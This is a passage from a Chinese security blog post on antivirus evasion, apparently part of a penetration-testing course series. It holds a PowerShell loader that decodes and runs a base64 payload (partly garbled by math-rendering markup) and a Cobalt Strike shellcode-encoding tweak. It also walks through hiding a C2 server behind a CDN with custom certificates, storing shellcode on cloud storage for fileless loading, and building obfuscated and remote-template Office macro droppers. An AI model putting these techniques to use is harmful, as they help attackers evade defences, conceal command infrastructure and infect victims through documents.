</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">2</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>xx3=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Strin<br>
g(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mn>3</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x3))
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">3</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>xxx=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mi>x</mi><mn>1</mn><mo>+</mo></mrow><annotation encoding="application/x-tex">xx1+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mord">+</span></span></span></span>xx2+xx3
If ([IntPtr]::size -eq 8) {
start-job { param(a) IE <code>X $a &#125; -RunAs32 -Argument $xxx | wait-job | Receive- Job &#125; else &#123; I</code> EX $xxx<br>
}<br>
<strong>0x0 6</strong> 改变生成 <strong>C shellcode</strong> 的逻辑 直接 <strong>base 64</strong> 编码</p>
<p>public static byte[] toC(byte[] var0) {<br>
Packer var1 = new Packer();<br>
var1.addString(&quot;/* length: &quot; + var0.length + &quot; bytes */\n&quot;);<br>
var1.addString(“unsigned char buf[] = “” + CommonUtils.bString(toVeil(var0)) +<br>
“”;\n”);<br>
return var1.getBytes();<br>
}<br>
}</p>
<h4 id="1063-防朔源"><a class="markdownIt-Anchor" href="#1063-防朔源">#</a> 10.6.3 防朔源</h4>
<p><strong>0 x01 CDN</strong> 节点防拉黑 <strong>ip</strong></p>
<p>域名注册商：<span class="exturl" data-url="aHR0cHM6Ly9zZy5nb2RhZGR5LmNvbS8=">https://sg.godaddy.com/</span><br>
cdn 解析商：<span class="exturl" data-url="aHR0cHM6Ly9kYXNoLmNsb3VkZmxhcmUuY29tLw==">https://dash.cloudflare.com/</span><br>
c 2 模板：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RocmVhdGV4cHJlc3MvbWFsbGVhYmxlLWMy">https://github.com/threatexpress/malleable-c2</span></p>
<p>（ 1 ）前期准备</p>
<p>申请 godaddy 域名、配置 cloudflare、添加解析记录，指向 CS 的 IP、配置<br>
 DNS 服务器，使用 cloudflare、下载 C2 文件模版，修改配置并上传、启动 CS 加<br>
载 CS 模版，使用 stag 生成</p>
<p>（ 2 ）因为 cloudflare 的原因这里端口的设置需要注意以下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若是http，则只能设置80,8080,8880,2052,2082,2086,2095这些端口号</span><br><span class="line">若是https，则只能设置443,2053,2083,2087,2096,8443这些端口号</span><br></pre></td></tr></table></figure>
<p>（ 3 ）cs 后门生成使用 Stageless 模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">依次生成后门，如果对方进行朔源，拉黑的ip将会是域名解析的cdn ip</span><br></pre></td></tr></table></figure>
<p><strong>0x0 2</strong> 修改 <strong>cs</strong> 的 <strong>SSL</strong> 证书</p>
<p>（ 1 ）配置 SSL 设置</p>
<p>创建证书（SSL - 源服务器）、设置页面规则 (缓存级别 - 绕过)、保存 CSR &amp; 密<br>
匙 (server.pem&amp;server.key)</p>
<p>（ 2 ）生成证书文件</p>
<p>openssl pkcs12 -export -in server.pem -inkey server.key -out <span class="exturl" data-url="aHR0cDovL3d3dy55YW9zZXNlLg==">http://www.yaosese.</span><br>
xyz.p12 -name <span class="exturl" data-url="aHR0cDovL3d3dy55YW9zZXNlLnh5eg==">http://www.yaosese.xyz</span> -passout pass:123456<br>
keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkey<br>
store <span class="exturl" data-url="aHR0cDovL3d3dy55YW9zZXNlLnh5ei5zdG9yZQ==">http://www.yaosese.xyz.store</span> -srckeystore <span class="exturl" data-url="aHR0cDovL3d3dy55YW9zZXNlLnh5ei5wMTI=">http://www.yaosese.xyz.p12</span> -srcstoretype PK<br>
CS12 -srcstorepass 123456 -alias <span class="exturl" data-url="aHR0cDovL3d3dy55YW9zZXNlLnh5eg==">http://www.yaosese.xyz</span></p>
<p>（ 3 ）修改 teamserver</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">证书指向：www.yaosese.xyz.store</span><br><span class="line">证书密码： 123456</span><br></pre></td></tr></table></figure>
<p>（ 4 ）启动 teamserver</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver ip pass jquery-c2.4.5.profile</span><br></pre></td></tr></table></figure>
<p><strong>0x0 3 OSS</strong> 存储 <strong>shellcode</strong></p>
<p>将 shellcode 编码后存储在 oss 上，是安全的标志，可以进行免杀的无文件<br>
落地。云上开启 OSS 对象存储、创建 Bucket 列表、设置 Bucket 属性、上传 Sh<br>
ellcode 文件、获取地址 &amp; 代码加载</p>
<h4 id="1064-office套件宏病毒"><a class="markdownIt-Anchor" href="#1064-office套件宏病毒">#</a> 10.6.4 office 套件宏病毒</h4>
<p><strong>0 x0 1</strong> 本地宏引用</p>
<p>通过 cs 生成宏代码，打开 office 的选项，增加开发工具，新增宏为上线代<br>
码。存储为 97 - 23.doc 或者 docm、并且在首次打开 word 时启用宏可以上线。但<br>
是此宏会被杀毒软件自动清除，所以需要进行免杀，否则无法上线。</p>
<p><strong>0 x 02</strong> 本地宏引用 <strong>-</strong> 工具混淆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/outflanknl/EvilClippy</span><br><span class="line">EvilClippy -s 1.vba xd.doc</span><br><span class="line">Sub Hello()</span><br><span class="line">Dim X</span><br><span class="line">X=MsgBox(&quot;Hello VBS&quot;)</span><br></pre></td></tr></table></figure>
<p><strong>0 x0 3</strong> 本地宏引用 <strong>-</strong> 混淆 <strong>VBA -</strong> 失效</p>
<p>VBA 代码助手 macro_pack<br>
BadAssMacrosx-i payload.bin -w doc -p no -s classic -c 5 -o 1.vba<br>
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xnemNhcnNvbi9QYXlsb2Fkcy9ibG9iLzMwNjY2MTVjZGU1NWY5Y2Q2NzU1ZWQ4MWE3ZDgzYw==">https://github.com/lgzcarson/Payloads/blob/3066615cde55f9cd6755ed81a7d83c</span><br>
229f78e397/Methodology%20and%20Resources/Office%20-%<span class="exturl" data-url="aHR0cDovLzIwQXR0YWNrcy5tZA==">20Attacks.md</span></p>
<p><strong>0 x0 4</strong> 远程宏引用</p>
<p>将 docm 宏存储在远程 oss 或者 github 上，用带模板的 docx 通过修改 settin<br>
gs.xml 来指向远程宏木马所在的位置。<br>
（ 1 ）制作包含宏的恶意模版文件（.docm），注意用 EvilClippy 做一层免杀。<br>
（ 2 ）将恶意模版文件上传至服务器。如 Github、OSS 等公共文件平台。<br>
（ 3 ）新建并保存一个使用任意模版的 docx 文件。<br>
改 docx 后缀为 zip，解压 docx 文件，修改 word_rels\settings.xml.rels 文件<br>
的 Target 属性，将其指向部署恶意模版文件的服务器。<br>
（ 4 ）使用 zip 格式压缩文件，并重新命名后缀为 docx。<br>
（ 5 ）重新打开 docx 文件，并启用宏。</p>
</script></p>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-07-04 01:51:57" itemprop="dateModified" datetime="2023-07-04T01:51:57+08:00">2023-07-04</time>
  </span>
  <span id="2023/07/04/SAFE/10 免杀对抗/" class="item leancloud_visitors" data-flag-title="" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://n1h1l157.github.io/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" title="">http://n1h1l157.github.io/2023/07/04/SAFE/10 免杀对抗/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;PCwuTAfIR1Bnpkz.jpg" title="未命名">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>未命名</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;eZcPaFH4pt9Cx8k.jpg" title="未命名">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>未命名</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#101-%E6%BA%90%E7%A0%81%E5%B1%82%E9%9D%A2%E5%85%8D%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text"> 10.1 源码层面免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1011-c%E5%85%8D%E6%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 10.1.1 c 免杀</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8windows%E5%B0%86c%E6%96%87%E4%BB%B6%E7%BC%96%E8%AF%91%E4%B8%BAexe%E6%96%87%E4%BB%B6%E8%BF%90%E8%A1%8Cc%E6%96%87%E4%BB%B6%E5%8F%AF%E6%93%8D%E4%BD%9C%E7%A9%BA%E9%97%B4%E6%9B%B4%E5%A4%A7%E8%80%8C%E4%B8%8D%E5%83%8Fexe%E7%A8%8B"><span class="toc-number"></span> <span class="toc-text"> 用 windows 将 c 文件编译为 exe 文件运行，c 文件可操作空间更大，而不像 exe 程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1012-py%E5%85%8D%E6%9D%80"><span class="toc-number">0.1.</span> <span class="toc-text"> 10.1.2 py 免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81-2"><span class="toc-number">0.1.1.</span> <span class="toc-text"> （ 2 ）执行代码 2 ：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1013-powershell%E5%85%8D%E6%9D%80"><span class="toc-number">0.2.</span> <span class="toc-text"> 10.1.3 powershell 免杀</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9C%A8%E5%8E%9F%E5%9E%8B%E4%BB%A3%E7%A0%81%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%BA%9B%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E4%B9%8B%E5%90%8E%E8%BF%9B%E8%A1%8Creplace%E6%9B%BF%E6%8D%A2%E4%B8%BA%E7%A9%BA%E5%B9%B2%E6%89%B0%E6%A3%80%E6%B5%8B"><span class="toc-number"></span> <span class="toc-text"> 在原型代码中添加一些垃圾数据，编码解码之后，进行 replace 替换为空，干扰检测。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E9%85%8D%E5%90%88%E6%89%8B%E5%B7%A5%E6%B7%B7%E6%B7%86%E5%B0%86%E5%8E%9F%E5%9E%8B%E6%88%96%E7%BC%96%E7%A0%81%E5%90%8E%E7%9A%84%E4%BB%A3%E7%A0%81%E5%8A%A0%E4%B8%8A%E5%B9%B2%E6%89%B0%E6%95%B0%E6%8D%AE%E5%90%8E%E6%94%BE%E8%87%B3%E8%BF%9C%E7%A8%8Bhttp%E4%B8%8A"><span class="toc-number"></span> <span class="toc-text"> 也可以配合手工混淆，将原型或编码后的代码加上干扰数据后放至远程 http 上</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%85%B3%E9%94%AE%E6%9C%A8%E9%A9%AC%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E5%B0%86%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%AD%97%E8%8A%82%E6%B5%81%E6%B3%A8%E6%84%8F%E5%AD%97%E8%8A%82%E6%B5%81%E4%B8%8D"><span class="toc-number">0.0.1.</span> <span class="toc-text"> 找到关键木马，利用脚本将木马的核心代码转化为字节流，注意字节流不</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%83%BD%E5%8A%A0%E5%BC%95%E5%8F%B7"><span class="toc-number">0.0.2.</span> <span class="toc-text"> 能加引号</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1014-c-go%E5%85%8D%E6%9D%80"><span class="toc-number">0.1.</span> <span class="toc-text"> 10.1.4 c# go 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1015-asm-java%E5%85%8D%E6%9D%80"><span class="toc-number">0.2.</span> <span class="toc-text"> 10.1.5 asm java 免杀</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#102-py%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-number">1.</span> <span class="toc-text"> 10.2 py 无文件落地</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#102-1-%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text"> 10.2. 1 从文本中提取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1022-%E4%BB%8E%E5%8F%82%E6%95%B0%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text"> 10.2.2 从参数中提取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1023-%E4%BB%8Ehttp%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text"> 10.2.3 从 http 中提取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1024-%E4%BB%8Esocket%E8%8E%B7%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.4.</span> <span class="toc-text"> 10.2.4 从 socket 获取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1025-%E4%BB%8E%E5%9B%BE%E7%89%87%E4%B8%AD%E9%9A%90%E5%86%99%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.5.</span> <span class="toc-text"> 10.2.5 从图片中隐写木马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#103-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80"><span class="toc-number">2.</span> <span class="toc-text"> 10.3 内存加载免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1031-shellcode%E8%BD%ACuuid%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text"> 10.3.1 ShellCode 转 UUID 方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%94%AF%E4%B8%80%E8%AF%86%E5%88%AB%E7%A0%81uuid%E6%98%AF%E7%94%A8%E4%BA%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E4%B8%AD%E4%BB%A5%E8%AF%86%E5%88%AB%E4%BF%A1%E6%81%AF%E6%95%B0%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA-128-%E4%BD%8D"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 通用唯一识别码 (UUID), 是用于计算机体系中以识别信息数目的一个 128 位</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%87%E8%AF%86%E7%AC%A6%E6%A0%B9%E6%8D%AE%E6%A0%87%E5%87%86%E6%96%B9%E6%B3%95%E7%94%9F%E6%88%90%E4%B8%8D%E4%BE%9D%E8%B5%96%E4%B8%AD%E5%A4%AE%E6%9C%BA%E6%9E%84%E7%9A%84%E6%B3%A8%E5%86%8C%E5%92%8C%E5%88%86%E9%85%8Duuid-%E5%85%B7%E6%9C%89%E5%94%AF%E4%B8%80"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 标识符，根据标准方法生成，不依赖中央机构的注册和分配，UUID 具有唯一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%A7"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 性。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1032-shellcode%E8%BD%ACmac%E5%9C%B0%E5%9D%80%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text"> 10.3.2 ShellCode 转 MAC 地址方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mac%E5%9C%B0%E5%9D%80%E4%B9%9F%E5%8F%AB%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80-%E7%A1%AC%E4%BB%B6%E5%9C%B0%E5%9D%80%E7%94%B1%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%88%B6%E9%80%A0%E5%95%86%E7%94%9F%E4%BA%A7%E6%97%B6%E7%83%A7%E5%BD%95%E5%9C%A8%E7%BD%91%E5%8D%A1"><span class="toc-number">2.2.1.</span> <span class="toc-text"> MAC 地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9A%84eprom%E4%B8%80%E7%A7%8D%E9%97%AA%E5%AD%98%E8%8A%AF%E7%89%87%E9%80%9A%E5%B8%B8%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%A8%8B%E5%BA%8F%E6%93%A6%E5%86%99-ip%E5%9C%B0%E5%9D%80%E4%B8%8Emac%E5%9C%B0%E5%9D%80%E5%9C%A8%E8%AE%A1%E7%AE%97"><span class="toc-number">2.2.2.</span> <span class="toc-text"> 的 EPROM 一种闪存芯片，通常可以通过程序擦写。IP 地址与 MAC 地址在计算</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%BA%E9%87%8C%E9%83%BD%E6%98%AF%E4%BB%A5%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E7%9A%84ip%E5%9C%B0%E5%9D%80%E6%98%AF-32-%E4%BD%8D%E7%9A%84%E8%80%8Cmac%E5%9C%B0%E5%9D%80%E5%88%99%E6%98%AF-48-%E4%BD%8D-6-%E4%B8%AA%E5%AD%97"><span class="toc-number">2.2.3.</span> <span class="toc-text"> 机里都是以二进制表示的，IP 地址是 32 位的，而 MAC 地址则是 48 位（ 6 个字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8A%82%E7%9A%84"><span class="toc-number">2.2.4.</span> <span class="toc-text"> 节）的。</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1033-shellcode%E8%BD%ACipv4%E6%96%B9%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text"> 10.3.3 ShellCode 转 IPV4 方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#104-nim%E5%85%8D%E6%9D%80"><span class="toc-number">3.</span> <span class="toc-text"> 10.4 nim 免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1041-%E5%B7%A5%E5%85%B7%E5%B0%81%E8%A3%85%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.1.</span> <span class="toc-text"> 10.4.1 工具封装木马</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt=".N1h1l157"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">.N1h1l157</p>
  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">166</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">5</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">40</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
  </li>

        
  <li class="item">
    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
  </li>

        
  <li class="item">
    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2023/07/04/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2023/06/30/BOOK/61%E3%80%8A%E6%AD%BB%E4%BA%A1%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6%E3%80%8B%E4%B8%B9%E5%B0%BC%E6%B4%9B%C2%B7%E5%A5%91%E6%96%AF/" title="《死亡百科全书》丹尼洛·契斯">《死亡百科全书》丹尼洛·契斯</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2023/06/30/BOOK/21%E3%80%8A%E5%9B%B4%E5%9F%8E%E3%80%8B%E9%92%B1%E9%92%9F%E4%B9%A6/" title="《围城》钱钟书">《围城》钱钟书</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2023/07/01/VULNHUB/104%20BREAKOUT/" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2023/07/01/VULNHUB/130%20MOMENTUM2/" title="VULNHUB MOMENTUM2">VULNHUB MOMENTUM2</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2023/07/02/VULNHUB/120%20BEELZEBUB/" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
</div>

    <span><a href="/2023/07/04/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" title="XD22 Web 通用漏洞">XD22 Web 通用漏洞</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" title="未命名">未命名</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2023/06/30/BOOK/12%E3%80%8A%E4%B8%89%E4%BD%93%E3%80%8B%E5%88%98%E6%85%88%E6%AC%A3/" title="《三体》刘慈欣">《三体》刘慈欣</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
</div>

    <span><a href="/2023/06/30/BOOK/34%E3%80%8A%E6%9C%88%E4%BA%AE%E5%92%8C%E5%85%AD%E4%BE%BF%E5%A3%AB%E3%80%8B%E6%AF%9B%E5%A7%86/" title="《月亮和六便士》毛姆">《月亮和六便士》毛姆</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
